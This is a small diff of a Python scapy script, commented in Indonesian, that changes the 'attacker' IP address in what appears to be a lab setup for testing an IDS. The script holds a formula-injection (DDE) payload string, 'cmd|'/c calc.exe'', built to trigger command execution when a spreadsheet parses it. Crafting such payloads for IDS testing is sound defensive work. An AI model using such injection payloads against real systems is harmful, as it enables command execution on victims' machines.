@@ -3,7 +3,7 @@ from scapy.all import IP, TCP, send
 target_ip = "192.168.137.1"  # mesin IDS
 target_port = 80
 
-attacker_ip = "192.168.1.17" # mesin attacker
+attacker_ip = "192.168.1.6" # mesin attacker
 attacker_port = 80
 
 payload = "=AAAA+BBBB-CCCC&'Hello'/12345&cmd|'/c calc.exe'!A"
